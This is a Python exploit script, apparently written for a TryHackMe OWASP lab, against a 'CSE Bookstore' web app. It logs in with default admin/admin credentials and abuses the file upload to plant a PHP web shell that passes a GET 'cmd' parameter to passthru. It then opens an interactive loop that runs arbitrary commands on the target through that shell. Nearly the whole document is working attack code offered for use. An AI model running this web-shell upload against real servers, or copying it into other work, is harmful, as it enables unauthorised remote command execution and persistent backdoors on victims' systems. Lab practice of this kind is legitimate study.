#!/usr/bin/python3
#python code to take the insecure command execution vulnerability in cse store of owasp 10 room by ben in tryhackme platform
#users of this exploit are advised to firstly configure values of variables as of your need.
#Thankyou for using this exploit.
import requests
import optparse
import sys
import os
from time import sleep

class getSession:
    payloadfilename="krnexploitpayload.php"
    payloaddir="bootstrap/img"
    adminlogin="admin_verify.php"
    uploadingurl="admin_add.php"
    def __init__(self,url):
        self.url=url
        self.connect()
    def connect(self):
        print(f"[+] Trying to login into {self.url}/{self.adminlogin}...... ")
        self.s=requests.session()
        #firstly login
        parameters={"name":"admin","pass":"admin","submit":"Submit+Query"}
        if((self.s.post(self.url+"/"+self.adminlogin,data=parameters).status_code)==200):
            print("[+] Login Successfull.")
        else:
            print("[-] Unable to login.")
            
class uploadingBackdoor(getSession):
    def exploit(self):
        print("[+] Checking if payload already exists or not.")
        r=self.s.get(self.url+"/"+self.payloaddir)
        if(r.status_code == 200):
            if self.payloadfilename not in r.text:
                self.upload()
            else:
                print("[+] payload already exists.")
        else:
            print("[-] Failed to check for payload already existence.")
        print("[+] Getting shell...............")
        sleep(3)
        while True:
            cmd=input("$ ")
            if(cmd=="exit"):
                break
            cmdr=self.s.get(self.url+"/"+self.payloaddir+"/"+self.payloadfilename+"?cmd="+cmd)
            if(cmdr.status_code ==200):
                print(cmdr.text)
            else:
                print("[+] Connection Tunnel disturbed.")
        
    def upload(self):
        print("[+] Sending payload")
        r=self.s.post(self.url+"/"+self.uploadingurl,files={"image":(self.payloadfilename,"<?php passthru($_GET['cmd']);?>","text/php")},data={"add":"1"})
        if(r.status_code == 200):
            print("[+] Uploading sucessfull")
        else:
            print("[-] Failed to upload")
        sleep(2)
        
def eXploit(url):
    print(f"Url :: {url}")
    print()
    exp=uploadingBackdoor(url)
    exp.exploit()

if __name__ == "__main__":
    parser = optparse.OptionParser('''Python exploit to get unauthenticated reverse shell in `CSE Bookstore` of owasp 10
\n
Made by krn_bhargav\n
./csestoreexploit.py -u [url of the target]

example :: ./csestoreexploit.py -u http://192.198.34.45''')
    parser.add_option("-u",action="store",dest="url",type="string",help="Url of the target machine.");
    options,args=parser.parse_args()
    
    url=str(options.url)
    
    if(len(args)==0):
        if(url=="None"):
            parser.error("Url of the target is required.")
        else:
            eXploit(str(url))
    else:
        parser.error("Arguments is not required,use -h for help.")
    
    
